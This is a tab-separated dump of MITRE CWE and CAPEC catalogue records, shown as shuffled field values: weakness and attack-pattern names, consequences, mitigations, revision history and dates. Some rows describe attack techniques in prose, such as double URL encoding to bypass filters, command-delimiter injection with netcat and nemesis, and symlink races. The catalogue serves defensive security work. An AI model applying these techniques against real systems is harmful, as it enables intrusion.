23656	70	Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning
20509	28	CWE Content Team
19883	35	MITRE
16021	85	592
13736	61	Draft
14307	39	2014-07-30
23327	21	PLOVER
15808	62	updated Common_Consequences
18980	62	updated Relationships, Other_Notes, Taxonomy_Mappings
9179	45	Variant
15696	28	CWE Content Team
19277	31	699
8424	35	MITRE
10225	74	2
17867	31	699
20321	76	2017-01-09
21038	28	CWE Content Team
21490	21	PLOVER
18764	53	The MITRE Corporation
25041	39	2008-11-24
12091	62	updated Related_Attack_Patterns
5742	28	CWE Content Team
17884	70	DoS Flaw in SOAP DTD Parameter
18038	91	Implementation
12604	35	MITRE
10782	50	Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.
16580	101	CAPEC Content Team
14173	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
24418	31	699
11553	21	CWE Content Team
18480	35	MITRE
23811	90	Language-Independent
16894	102	ChildOf
17927	26	Architecture and Design
15962	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website
7344	39	2008-07-01
14956	35	MITRE
11639	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Modes_of_Introduction, Potential_Mitigations, References, Relationships
12652	35	MITRE
9232	62	updated Description
18353	28	CWE Content Team
21379	39	2008-09-08
10327	102	ChildOf
7895	62	updated Common_Consequences
16782	28	CWE Content Team
9314	62	updated Research_Gaps
17089	28	CWE Content Team
5975	63	Hide Activities
8506	28	CWE Content Team
5774	39	2017-11-08
12941	85	425
16569	39	2008-07-01
6858	81	Confidentiality
16256	35	MITRE
5647	39	2012-10-30
12878	79	Confidentiality
24973	39	2009-10-29
5943	28	CWE Content Team
18057	35	MITRE
16200	73	Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)
18492	63	DoS: Resource Consumption (Other)
18421	95	[Try to create symlinks to different files] The attacker then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.
9912	35	Cigital
22394	42	Use a mutex if available, but be sure to avoid related weaknesses such as CWE-412.
24468	94	A buffer manipulation attack often results in a crash of the application due to the corruption of memory.
22583	76	2018-07-31
15608	99	SANS Software Security Institute
12862	35	MITRE
18811	40	The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.
14999	91	Architecture and Design
22675	42	Use getlogin_r() instead, which is reentrant, meaning that other processes are locked out from changing the username.
6931	62	updated Relationships, Other_Notes
16739	100	The MITRE Corporation
5586	28	CWE Content Team
6093	90	Language-Independent
19435	28	CWE Content Team
16069	35	MITRE
12538	62	updated Description, Name
11449	21	CWE Content Team
20456	28	CWE Content Team
18543	90	Language-Independent
6130	31	699
12738	62	updated Time_of_Introduction
15834	88	Use of getlogin() in Multithreaded Application
17536	35	MITRE
18173	77	Automated Static Analysis - Source Code
22029	39	2009-03-10
19375	28	Eric Dalci
19620	48	03
15789	35	MITRE
15178	62	updated Common_Consequences
22489	94	Run Arbitrary Code
13323	23	The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.
20993	35	MITRE
5694	62	updated Relationships
6248	28	CWE Content Team
17137	103	Primary
10960	31	1003
14407	35	MITRE
5827	39	2012-05-11
23085	62	updated References
21437	26	Implementation
15706	26	Implementation
13708	72	This weakness can lead to erroneous results that can cause unexpected application behaviors.
7874	55	CAPEC Content Team
7846	40	Use of untrusted communication paths enables an attacker to intercept and log communications, including metadata such as packet timing and sizes.
21253	23	This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.
24382	91	Architecture and Design
5825	28	CWE Content Team
21735	27	An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into.
16351	91	Operation
22527	101	CAPEC Content Team
9359	39	2017-05-03
24462	63	Hide Activities
24204	88	Use of Obsolete Function
21554	35	MITRE
13144	92	Explore
15838	62	updated Relationships
12113	39	2011-03-29
9830	45	Variant
6635	97	Lifting Sensitive Data Embedded in Cache
13503	28	CWE Content Team
18786	49	2012
17107	89	Detailed
22323	81	Confidentiality
10696	78	Low
11103	76	2019-04-04
17105	35	MITRE
24796	103	Primary
12902	35	MITRE
25053	35	MITRE
15911	35	MITRE
16831	96	2009-03-03
5848	26	Implementation
23277	62	updated Description, Relationships
12636	61	Stable
19918	100	The MITRE Corporation
15766	33	Apple
17863	28	CWE Content Team
18723	62	updated Related_Attack_Patterns
24398	62	updated Relationships, Taxonomy_Mappings
24229	35	MITRE
11861	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as expression or command delimiters when they are sent to a downstream component.
16499	69	Draft
18973	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
21432	79	Integrity
19494	39	2015-12-07
23847	62	updated Potential_Mitigations
22015	39	2014-07-30
23648	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
23630	54	Low
13170	91	Architecture and Design
18430	35	MITRE
8752	35	MITRE
23380	35	MITRE
23689	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.
15886	28	CWE Content Team
22657	57	Indirect
15718	28	CWE Content Team
6233	28	CWE Content Team
8489	103	Primary
23821	35	MITRE
19175	28	CWE Content Team
22530	101	CAPEC Content Team
6168	35	MITRE
19224	62	updated Common_Consequences
11771	28	CWE Content Team
5932	35	MITRE
6270	39	2011-09-13
17594	81	Confidentiality
13199	28	CWE Content Team
20432	35	MITRE
21147	90	Language-Independent
24143	39	2017-05-03
9574	90	Language-Independent
23478	35	MITRE
19923	50	Assume all input is malicious. Create a white list that defines all valid input to the application based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.
14257	104	444
14566	88	Failure to Handle Incomplete Element
23325	28	CWE Content Team
19788	28	CWE Content Team
12992	81	Access Control
10113	28	CWE Content Team
20465	39	2008-10-14
12223	73	Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.
24336	39	2009-05-27
9914	62	updated Demonstrative_Examples
16610	28	CWE Content Team
14787	79	Confidentiality
21843	80	Adversaries can purchase hardware and software solutions, or create their own solutions, to capture/intercept cellular radio traffic. The cost of a basic Base Transceiver Station (BTS) to broadcast to local mobile cellular radios in mobile devices has dropped to very affordable costs. The ability of commercial cellular providers to monitor for "rogue" BTS stations is poor in many areas and it is assumed that "rogue" BTS stations exist in urban areas.
19232	39	2014-07-30
19859	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
7367	43	Simple
12168	39	2011-09-13
10028	39	2011-03-29
20336	28	CWE Content Team
24170	93	Defense in Depth
9187	62	updated Potential_Mitigations, Time_of_Introduction
18637	86	http://blogs.sans.org/appsecstreetfighter/2010/03/11/top-25-series-rank-13-php-file-inclusion/
17935	35	MITRE
18422	45	Base
17794	35	MITRE
16942	56	CanPrecede
10199	24	Cigital
22120	47	Unreliable Execution
12615	79	Confidentiality
21509	62	updated Potential_Mitigations
21853	35	MITRE
8751	28	CWE Content Team
16938	35	MITRE
25232	47	Modify Data
8121	85	305
24993	21	Anonymous Tool Vendor (under NDA)
24349	103	Primary
25039	39	2008-07-01
21536	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report array index errors that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.
18423	79	Integrity
23887	103	Primary
15338	56	ChildOf
11111	42	Ensure that an action form mapping enables validation. Set the validate field to true.
20745	66	Web Application Firewall Evaluation Criteria
16698	57	Primary
20444	44	Moderate
22538	35	MITRE
23116	28	CWE Content Team
19010	35	Cigital
13998	90	Java
25020	35	MITRE
7352	62	updated Description, Relationships, Other_Notes, Weakness_Ordinalities
13792	26	Architecture and Design
13198	62	updated Potential_Mitigations, Time_of_Introduction
9048	21	PLOVER
12678	39	2017-11-08
16934	48	07
22590	35	MITRE
16292	63	Bypass Protection Mechanism
12325	62	updated Relationships, Taxonomy_Mappings
22403	27	None: No specialized resources are required to execute this type of attack.
17188	81	Other
24072	95	[Find Session IDs] The attacker interacts with the target host and finds that session IDs are used to authenticate users.
20441	26	Implementation
18355	35	MITRE
17165	81	Other
21971	79	Integrity
11850	62	updated Potential_Mitigations
21360	39	2017-01-19
18509	60	24
25198	33	S. Christey
23605	62	updated Common_Consequences, Relationships
18825	62	updated Relevant_Properties
16351	91	Implementation
8663	81	Access Control
17500	39	2010-12-13
20537	35	MITRE
19536	100	The MITRE Corporation
10509	28	CWE Content Team
8060	38	Unicode encoded data is passed to APIs where it is not expected
22929	39	2017-11-08
18030	39	2012-10-30
14884	62	updated Common_Consequences
16613	88	Excessive Code Complexity
10802	79	Non-Repudiation
16003	33	Microsoft Security Vulnerability Research & Defense
15775	67	High
23329	91	Architecture and Design
7190	42	Add integrity checks to detect tampering.
7667	62	updated Relationships
13338	59	Updated References
20474	77	Automated Static Analysis
13810	35	MITRE
14960	35	MITRE
9657	91	Architecture and Design
13220	61	Draft
13323	97	Double Encoding
10347	72	An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands.
24427	23	This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An attacker who has access to an API may try to embed malicious code in the API function call and exploit a buffer overflow vulnerability in the function's implementation. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.
13361	39	2009-07-27
21026	55	CAPEC Content Team
12860	39	2018-03-27
13162	62	updated Relationships
22134	39	2011-06-27
20365	28	CWE Content Team
22729	103	Primary
17492	35	MITRE
15888	39	2017-05-03
15577	21	CWE Content Team
10805	46	If the decision to trust the methods and data of an object is based on the name of a class, it is possible for malicious users to send objects of the same name as trusted classes and thereby gain the trust afforded to known classes and types.
24323	39	2008-07-01
19182	89	Detailed
6523	81	Other
6272	97	IP (DF) 'Don't Fragment Bit' Echoing Probe
8922	28	CWE Content Team
16242	21	PLOVER
19472	100	The MITRE Corporation
10979	35	MITRE
19334	91	Architecture and Design
13880	23	A product's design or configuration explicitly requires the publication of information that could be regarded as sensitive by an administrator.
17791	62	updated Relationships
10405	35	MITRE
18323	31	699
11267	102	ChildOf
14917	53	The MITRE Corporation
12537	35	MITRE
12078	28	CWE Content Team
21355	96	2009-12-04
10806	81	Confidentiality
12009	35	MITRE
13839	95	[Find Injection Entry Points] The attacker first takes an inventory of the entry points of the application.
6072	26	Implementation
18335	76	2018-07-31
17313	39	2012-10-30
8474	35	MITRE
16715	42	Implement and perform bounds checking on input.
19719	91	Implementation
13425	28	CWE Content Team
25193	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
10801	45	Base
6738	25	Low
17212	81	Confidentiality
22106	66	Providing a Framework for Effective Software Quality Assessment
7838	78	Very High
11614	63	Modify Application Data
7861	43	Simple
12278	39	2010-02-16
21533	81	Integrity
19404	35	MITRE
22958	56	ChildOf
7436	97	Influence Perception
14964	56	ChildOf
18863	76	2019-04-04
17915	91	Implementation
25217	62	updated Relationships, Other_Notes, Taxonomy_Mappings
17276	86	http://marc.info/?l=secprog&m=108379742110553&w=2
20542	39	2017-11-08
9663	39	2014-07-30
20024	28	CWE Content Team
16885	74	1
10321	74	1
16544	95	[Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.
12811	23	This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The attacker crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.
8259	62	updated Name, Related_Attack_Patterns
8179	39	2014-02-13
10685	28	CWE Content Team
23640	63	Read Application Data
24147	24	Cigital
16819	31	1000
24568	35	Cigital
15490	78	Low
10981	63	Unexpected State
17602	33	Justin Schuh
22747	50	Usage: Users should always explicitly log out from the social networking sites when done using them.                Usage: Users should not open other tabs in the browser when using a social networking site.
14070	90	Language-Independent
25357	35	MITRE
11320	76	2019-04-04
23054	39	2014-06-23
19195	59	Updated Related_Attack_Patterns
22601	28	CWE Content Team
9681	56	ChildOf
22401	39	2008-07-01
17176	97	Counterfeit GPS Signals
19905	62	updated Relationships
22417	62	updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships
16246	78	Medium
24507	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
22848	39	2012-10-30
13894	56	ChildOf
10037	103	Primary
23846	28	CWE Content Team
14745	69	Draft
20596	35	MITRE
21674	44	SOAR Partial
7223	69	Draft
17852	39	2008-09-08
15377	102	ChildOf
16791	62	updated Potential_Mitigations
5942	28	CWE Content Team
16055	79	Availability
18168	79	Confidentiality
23182	28	CWE Content Team
13977	74	1
14446	91	Implementation
20764	31	1000
7540	26	Architecture and Design
21548	39	2015-12-07
10596	35	MITRE
22248	44	High
15262	69	Incomplete
9113	62	updated Applicable_Platforms
12840	103	Primary
14834	35	MITRE
6808	63	Read Files or Directories
8904	100	The MITRE Corporation
23448	28	CWE Content Team
25358	62	updated Type
24295	28	CWE Content Team
11854	63	Bypass Protection Mechanism
11902	42	Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered.
19455	28	CWE Content Team
23863	39	2014-06-23
10812	21	PLOVER
11705	28	CWE Content Team
13468	28	CWE Content Team
17232	42	For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.
21681	34	The programmer rarely intends for a format string to be externally-controlled at all. This weakness is frequently introduced in code that constructs log messages, where a constant format string is omitted.
6731	62	updated Taxonomy_Mappings
24945	35	MITRE
9362	32	FBI
18529	56	ChildOf
24133	69	Draft
16713	51	2014-06-23
16060	100	The MITRE Corporation
17238	76	2018-07-31
14296	28	CWE Content Team
9446	39	2014-07-30
13905	56	ChildOf
10312	42	Using names for security purposes is not advised. Names are easy to forge and can have overlapping user IDs, potentially causing confusion or impersonation.
18210	90	C
13340	73	Man-in-the-Middle intercepts secure communication between two parties.
21394	35	MITRE
16589	23	An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.
5987	35	MITRE
19175	39	2010-09-27
14194	35	MITRE
6470	81	Access Control
20787	56	ChildOf
11998	40	For this type of attack to be successful, a few prerequisites must be met. First, the targeted software must be written in a language that enables fine grained buffer control. (e.g., c, c++) Second, the targeted software must actually perform buffer operations and inadequately perform bounds-checking on those buffer operations. Finally, the adversary must have the capability to influence the input that guides these buffer operations.
18494	62	updated Description, Relationships, Other_Notes, Weakness_Ordinalities
20536	91	Architecture and Design
17267	80	The adversary requires strong inter-personal and communication skills.
10129	28	CWE Content Team
15815	79	Access Control
7680	81	Integrity
5878	28	CWE Content Team
10335	90	Java
5779	69	Incomplete
20084	103	Primary
22403	54	Low
19615	80	This attack can get sophisticated since the attack has to occur within a short interval of time.
8915	62	updated Common_Consequences
23906	23	The application does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.
8728	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
12349	28	CWE Content Team
22865	103	Primary
12624	39	2011-06-01
13966	56	ChildOf
6036	28	CWE Content Team
21374	79	Confidentiality
17901	31	1000
18668	39	2017-11-08
19424	79	Availability
22851	104	441
18169	39	2019-01-03
15039	62	updated Related_Attack_Patterns, Relationships
16800	39	2013-02-21
19937	97	Command Line Execution through SQL Injection
17871	76	2019-09-30
14858	62	updated Common_Consequences
6973	90	Language-Independent
21348	31	699
13959	35	MITRE
16883	63	Other
23122	39	2014-06-23
5704	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
21741	76	2018-07-31
9139	62	updated Affected_Resources, Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Weakness_Ordinalities
13373	103	Primary
7467	43	Simple
11416	35	MITRE
7633	21	PLOVER
18961	91	Architecture and Design
6312	28	CWE Content Team
15249	28	CWE Content Team
17842	25	High
20416	28	CWE Content Team
7156	53	The MITRE Corporation
17299	28	CWE Content Team
10951	53	The MITRE Corporation
6617	35	MITRE
21160	46	When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.
14971	62	updated Relationships
21275	35	MITRE
11805	79	Accountability
19600	35	MITRE
23975	39	2008-09-08
25087	99	SANS Software Security Institute
16493	35	MITRE
15645	26	Implementation
24278	39	2008-09-08
15453	63	Gain Privileges or Assume Identity
15492	62	updated Description
25110	91	Architecture and Design
25331	56	ChildOf
8282	59	Updated Resources_Required
24204	46	As programming languages evolve, functions occasionally become obsolete due to:                                                Advances in the language                   Improved understanding of how operations should be performed effectively and securely                   Changes in the conventions that govern certain operations                                          Functions that are removed are usually replaced by newer counterparts that perform the same task in some different and hopefully improved way.
22320	35	MITRE
20690	28	CWE Content Team
24460	91	Implementation
20353	35	MITRE
18354	28	CWE Content Team
23125	28	Eric Dalci
23818	40	A network capable of routing the attackers' packets to the destination network.
8554	79	Authorization
22145	28	CWE Content Team
6822	35	MITRE
25273	69	Incomplete
17401	50	2. Preventing with .htaccess in Apache web server: In .htaccess, write "Options-indexes".
17902	88	Use of Low-Level Functionality
10144	40	The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.
17100	23	Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or "fishing" for information.
20515	35	MITRE
9891	30	P.J. Leadbitter
20523	69	Draft
8188	39	2012-05-11
20465	62	updated Description
22744	40	Password recovery mechanism has been designed or implemented insecurely.
24902	35	MITRE
8118	104	1088
13224	81	Integrity
10179	94	Run Arbitrary Code
11591	96	2009-10-21
10805	43	Simple
17820	81	Integrity
8489	31	1000
14182	62	updated Common_Consequences
15206	91	Testing
22382	99	McGraw-Hill/Osborne
18534	62	updated Relationships
25097	28	CWE Content Team
23582	103	Primary
23311	39	2018-03-27
9254	56	ChildOf
16402	35	MITRE
8228	26	Operation
19212	35	MITRE
23030	24	MITRE
21388	59	Updated References
8477	62	updated Applicable_Platforms, Name, Relationships, Other_Notes, Taxonomy_Mappings
20188	56	ChildOf
18343	88	Unverified Ownership
15044	28	CWE Content Team
23915	78	High
18254	31	1000
6734	35	MITRE
10760	43	Simple
20842	50	Use a strong source of randomness to generate a session ID.
18400	35	MITRE
17123	63	Reduce Performance
13221	59	Updated Related_Attack_Patterns
18528	102	ChildOf
14773	35	MITRE
11579	50	Design: Enforce principle of least privilege.
18126	74	4
8721	51	2015-11-09
25108	43	Simple
22707	63	Gain Privileges or Assume Identity
20150	28	CWE Content Team
7521	39	2012-05-11
10942	35	MITRE
24852	62	updated Common_Consequences
6649	39	2019-01-03
20465	35	MITRE
16651	85	84
23648	77	Automated Static Analysis - Source Code
22999	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
7496	62	updated Relationships, Other_Notes
17401	89	Detailed
15827	88	Reliance on Data/Memory Layout
8554	47	Bypass Protection Mechanism
25369	67	High
15894	28	Sean Eidemiller
17105	39	2010-06-21
16227	90	Language-Independent
13423	94	Information Leakage
11784	35	MITRE
9552	69	Draft
10823	35	MITRE
21624	102	ChildOf
16218	62	updated References
23980	103	Primary
22352	31	699
6096	63	Modify Application Data
24138	62	updated Potential_Mitigations
22556	39	2011-03-29
8034	101	CAPEC Content Team
5755	39	2008-09-08
16238	39	2017-05-03
15779	28	CWE Content Team
13766	62	updated Relationships
16479	42	If privileged APIs make certain assumptions about data, context or state validity that are passed by the caller, the calling code must ensure that these assumptions have been validated prior to making the call.
17342	35	MITRE
7603	39	2008-07-01
17135	35	MITRE
15005	35	MITRE
8418	23	The software's random number generator produces a series of values which, when observed, can be used to infer a relatively small range of possibilities for the next value that could be generated.
13762	39	2011-06-27
24107	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
17654	39	2011-06-01
14290	28	CWE Content Team
9045	28	CWE Content Team
13039	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
24525	26	Implementation
24713	28	CWE Content Team
17637	91	Architecture and Design
13024	47	Gain Privileges
9435	45	Base
18052	35	MITRE
17319	56	ChildOf
22973	31	699
16029	21	CWE Content Team
19142	56	ChildOf
13644	62	updated Common_Consequences
8444	28	CWE Content Team
22605	62	updated Potential_Mitigations, Time_of_Introduction
14441	91	Operation
13942	62	updated Relationships
18909	36	http://en.wikipedia.org/wiki/Symlink_race
13068	56	ChildOf
19441	94	The adversary is able to read sensitive information about the system in the registry.
12322	28	CWE Content Team
18781	39	2009-10-29
10073	39	2009-10-29
13198	39	2008-07-01
12753	90	C
11366	62	updated Relationships
16336	32	Proceedings of the 2016 ACM on Cloud Computing Security Workshop
12209	79	Integrity
15158	25	High
14332	69	Draft
12568	56	ChildOf
16767	28	CWE Content Team
7242	76	2017-08-04
15139	61	Draft
6977	81	Access Control
25293	89	Standard
18777	100	The MITRE Corporation
6290	97	Process Footprinting
8260	55	CAPEC Content Team
13413	62	updated Related_Attack_Patterns
12895	27	The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.
11037	62	updated Relationships
17114	23	An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.
10837	28	CWE Content Team
15297	28	CWE Content Team
20029	35	MITRE
21309	42	The shutdown function should be a privileged function available only to a properly authorized administrative user
21767	26	Implementation
15393	39	2009-07-27
14214	38	Bad data is passed to the XML parser (possibly repeatedly), possibly making it crash or execute arbitrary code.
13853	39	2012-05-11
19450	39	2011-06-01
19972	28	CWE Content Team
14121	35	MITRE
19025	39	2019-01-03
19699	33	WhiteHat Security
21632	91	Implementation
11855	35	MITRE
20221	35	MITRE
22689	39	2009-03-10
11296	39	2012-10-30
9795	63	Modify Files or Directories
20548	45	Base
9157	35	MITRE
13301	51	2017-01-12
12020	62	updated Demonstrative_Examples, Description, Maintenance_Notes, Potential_Mitigations
19000	39	2010-06-21
12602	28	CWE Content Team
11584	86	https://support.microsoft.com/en-us/help/240797/how-to-stop-an-activex-control-from-running-in-internet-explorer
12144	39	2011-06-01
22485	28	CWE Content Team
15562	50	Refer to the RFCs to safely decode URL.
6102	63	Varies by Context
17745	28	CWE Content Team
6665	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24517	28	CWE Content Team
6542	28	CWE Content Team
25021	26	Implementation
12695	103	Primary
15927	56	ChildOf
14518	100	The MITRE Corporation
13681	80	To insert a network sniffer or other listener into the communication stream
13896	26	Architecture and Design
20203	62	updated Description
11429	62	updated Relationships
6447	79	Integrity
16917	76	2019-04-04
11932	21	PLOVER
21368	28	CWE Content Team
11707	26	Architecture and Design
15167	26	Architecture and Design
16385	55	CAPEC Content Team
19011	79	Confidentiality
24132	47	Unreliable Execution
16687	28	CWE Content Team
20442	66	Secure your Rails apps!
25378	31	699
23528	88	Incorrect User Management
24168	101	CAPEC Content Team
11556	39	2008-09-08
18950	62	updated Potential_Mitigations, Time_of_Introduction
15540	69	Incomplete
7892	35	MITRE
17971	28	CWE Content Team
17527	73	Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.
6579	28	CWE Content Team
12861	28	CWE Content Team
23148	39	2008-10-14
14891	21	PLOVER
13396	62	updated Potential_Mitigations
18747	28	CWE Content Team
7049	31	1000
6262	103	Primary
22217	100	The MITRE Corporation
8217	81	Integrity
18167	99	SANS Software Security Institute
20080	39	2011-06-27
11897	50	Implementation: Virus scanning on host
7270	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
16587	28	CWE Content Team
22636	42	Perform input validation.
9520	62	updated Description, Name, Related_Attack_Patterns
10148	28	CWE Content Team
15644	39	2008-09-08
20952	21	PLOVER
17739	89	Standard
6745	53	The MITRE Corporation
23072	25	Medium
22513	39	2017-11-08
12843	28	CWE Content Team
20815	26	Operation
6752	102	ChildOf
16363	39	2011-06-01
22339	40	The adversary typically requires physical proximity to the target's environment, whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping, if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally.
8515	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
10915	35	Cigital
10438	63	Quality Degradation
11858	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
17964	63	Modify Memory
16577	31	1000
11076	31	1000
16057	61	Draft
9640	45	Variant
14210	62	updated References
9634	39	2008-09-24
22946	56	ChildOf
16378	103	Primary
19273	40	The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client.
9011	28	Eric Dalci
12232	35	MITRE
7044	56	ChildOf
11090	28	CWE Content Team
12737	28	CWE Content Team
16518	76	2018-07-31
24092	31	1000
23371	62	updated Potential_Mitigations
15358	39	2014-07-30
6407	91	Architecture and Design
22922	21	PLOVER
9388	79	Confidentiality
5800	89	Standard
13270	39	2012-05-11
6786	103	Primary
24204	90	Language-Independent
19681	77	Dynamic Analysis with Manual Results Interpretation
18836	81	Availability
15689	21	PLOVER
5872	28	CWE Content Team
6612	74	1
9151	28	CWE Content Team
11206	35	MITRE
21320	62	updated Common_Consequences
7804	35	MITRE
13596	35	MITRE
25105	62	updated Relationships
23379	63	Read Memory
21012	45	Base
10233	31	1000
19122	51	2014-06-23
23593	62	updated Relationships
24256	50	Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.
21181	50	Regular expressions can be used to filter out backslash. Make sure you decode before filtering and validating the untrusted input data.
24532	73	Commands that allow reading or writing end user files can be executed.
20139	39	2010-09-27
23861	28	CWE Content Team
21219	28	CWE Content Team
11456	39	2017-11-08
22168	79	Integrity
24234	61	Draft
23733	39	2019-06-20
22630	31	1000
20044	39	2017-11-08
9325	101	CAPEC Content Team
14787	79	Authorization
18356	54	High
9824	81	Other
9572	79	Availability
6517	62	updated Demonstrative_Examples, Relationships
17096	50	Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands
14994	28	CWE Content Team
13070	74	5
13055	61	Draft
6815	47	Read Data
9848	101	CAPEC Content Team
22151	90	C
10564	21	PLOVER
9218	39	2012-05-11
